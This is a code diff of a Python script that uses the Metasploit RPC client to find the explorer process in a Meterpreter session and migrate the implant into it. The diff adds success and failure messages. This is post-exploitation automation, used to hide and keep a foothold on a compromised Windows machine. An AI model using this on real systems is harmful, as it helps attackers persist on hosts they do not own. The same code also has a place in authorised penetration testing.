@@ -5,14 +5,17 @@ def init(client,sid):
     session = client.sessions.session(sid)
     session.write("ps")
     sleep(5)
+    success = ''
     for line in session.read().split("\n"):
-        if "explorer.exe" in line:
-            print(line)
+        #print(line)
+        if "explorer" in line:
             explorer = line.split(" ")
             pid = explorer[1]
             session.run_with_output("migrate {}".format(pid), timeout = 150)
-            print("Session has successfully migrated, meterpreter has upgraded to x64!")
-    exit()
+            success = 'true'
+            print("[*] Session has successfully migrated!")
+    if success != 'true':
+        print("[*] Session failed to migrate!")
 
 if __name__ == '__main__':
     client = MsfRpcClient('123',port=55552)
